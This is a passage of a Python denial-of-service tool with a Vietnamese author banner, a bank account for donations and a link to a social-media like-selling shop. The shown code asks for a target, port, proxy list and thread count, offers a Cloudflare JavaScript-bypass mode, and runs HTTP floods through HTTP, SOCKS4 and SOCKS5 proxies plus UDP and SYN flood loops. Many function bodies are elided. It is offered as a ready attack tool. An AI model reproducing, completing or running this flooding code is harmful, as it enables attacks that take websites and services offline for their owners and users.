...
║                                     ║ MB Bank: 1908888888889   ║
║                                     ║ Support: Lê Quang Minh   ║
╚════════════════════════════════════════════════════════════════╝
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ TOOL Distributed Denial of Service (DDoS)
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ Bản Quyền: Lê Quang Minh (ʚMunɞ)
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ Shop Like-Sub FB : https://likesubfb591.com/
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -''')

    try:
        print("\n[LQM] Target : " +str(url_main)+ ":" +str(port))
    except:
        pass
    try:
        print("[LQM] Method : " +str(name_method_attack))
    except:
        pass
    try:
        print("[LQM] Mode   : " +str(filenam2))
    except:
        pass
    try:
        print("[LQM] Bypass : v" +str(method_pass_cf))
        
    except:
        pass
    try:
        print("[LQM] Proxies: %s" %(len(open(out_file).readlines())))
    except:
        pass
    try:
        print("[LQM] Threads: " +str(threads))
    except:
        pass
...
def start_url():
    ...
    try:
        ...
        print("[LQM] You Mistyped, Try Again [!]")
        start_url()
...
def start_port():
    global port
    print("-----------------------------")
    port = str(input("[LQM] Port [80]: "))
    if port == '':
        if "https" in url:
                port = int(443)
                print("[LQM] Selected Port = 443 [!]")
        else:
            port = int(80)
            print("[LQM] Selected Port = 80 [!]")
    else:
        port = int(port)
...
def proxies_list():
    ...
    if sys.platform.startswith("linux"):
        ...
        for file in glob("*.txt"):
            print("|_--> " + file)
    out_file = str(input("[LQM] " +str(filenam2)+ " [" +str(filenam1)+ ".txt]: "))
    if out_file == "":
        out_file = str(filenam1)+".txt"
    proxies = open(out_file).readlines()
    #print ("[LQM] Number Of Proxies: %s" %(len(open(out_file).readlines())))
    numthreads()
...
def proxyget():
    ...
    f.close() 
    proxies = open(out_file).readlines()
    #print("[LQM] Get Proxies Successfully ( Live 100% ) [" +out_file+ "] = [ " +str(len(open(out_file).readlines()))+ " ]")
    numthreads()
...
[+]===========================[+]
""")
    choice_mode = input("[LQM] Attack Mode [0-6]: ")
    if choice_mode == "0":
        filenam2 = "Home"
        ...
        filenam2 = "JS-Bypass"
        method_pass_cf = input("[LQM] Method [1/2]: ")
        if (method_pass_cf == "") or (method_pass_cf == "1"):
            print("[LQM] Selected Method Bypass JS v1")
            method_pass_cf = "1"
        else:
            print("[LQM] Selected Method Bypass JS v2")
            method_pass_cf = "2"
...
def pass_cf():
    ...
    try:
        ...
        print("[LQM] Bypass Has Been Completed!")
        numthreads()
    except:
        error_cf += 1
        print("[LQM] Bypassing Again... [" +str(error_cf)+ "]")
        if error_cf>5:
            os.system("cls")
            print("[LQM] ERROR BYPASS\n[!] Please Select Another Attack Or Ignore Method[!]")
            start_mode()
        else:
            pass_cf()
...
def choice_method_attack():
    ...
    if (method_attack == "1") or (method_attack == ""):
        ...
        print("[LQM] Selected Method Attack Normal")
        method_attack = "1"
    elif method_attack == "2":
        name_method_attack = "Spam"
        print("[LQM] Selected Method Attack Spam")
    else:
        print ("[LQM] You mistyped, try again [!]\n")
        choice_method_attack()
    start_mode()
...
def choice_down_proxies():
    ...
    choice4 = input("[LQM] Get New List " +str(filenam2)+ " [Y/N]: ")
    if (choice4 == "y") or (choice4 == "Y"):
        print("-----------------------------")
        print("|_--> 1: Server X")
        print("|_--> 2: Server Z")
        sel_pr = input("[LQM] Server Get [1/2]: ")
        ...
        print("[LQM] Selected No Get New List " +str(filenam2)+ " [!]")
        proxies_list()
...
def numthreads():
    ...
    try:
        print("-----------------------------")
        threads = int(input("[LQM] Threads [2000]: "))
    except ValueError:
        threads = int(2000)
        print ("[LQM] Selected Threads " +str(threads)+ " [!]\n")
    
    begin()

def begin():
    choice6 = input('[LQM] Press "Enter" to start attack: ')
    if choice6 == "":
        #webbrowser.open("https://www.youtube.com/lequanggminhhofficial", new=0, autoraise=True)
        if ("edu" in url) or ("vn" in url) or ("hentai" in url) or ("porn" in url):
            print("[LQM] Admin: LÊ QUANG MINH!")
            sleep(3)
        attack()
        print()
    else:
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[LQM] fb.com/lequangminh2k1 | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                #req_code += 1
                #sys.stdout.write("[LQM] fb.com/lequangminh2k1 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                print("[LQM] fb.com/lequangminh2k1 | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[LQM] fb.com/lequangminh2k1 | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[LQM] fb.com/lequangminh2k1 | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[LQM] fb.com/lequangminh2k1 | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[LQM] fb.com/lequangminh2k1 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[LQM] fb.com/lequangminh2k1 | LQM-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
...
def udpflood():
    ...
    while True:
        ...
        try:
            req_code += 1
            s.sendto(bytes,tar)
            sys.stdout.write("[LQM] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes,tar)
        ...
        while True:
            ...
            try:
                ...
                try:
                    ...
                    pass
            sys.stdout.write("[LQM] SYN Flood [ DDoS ] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
